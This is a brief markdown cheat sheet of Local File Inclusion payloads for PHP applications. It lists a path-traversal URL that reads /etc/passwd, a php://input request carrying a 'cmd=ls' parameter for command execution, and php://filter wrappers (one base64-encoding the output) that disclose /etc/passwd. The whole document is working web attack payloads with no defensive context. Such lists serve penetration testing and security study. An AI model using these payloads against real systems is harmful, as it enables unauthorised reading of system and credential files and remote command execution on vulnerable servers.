# Local File Inclusion examples

## PHP

- `/script.php?page=../../../../../../../../etc/passwd`
- `/fi/?page=php://input&cmd=ls`
- `vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd`: Then need to b64-decode the response
- `?page=php://filter/resource=/etc/passwd`
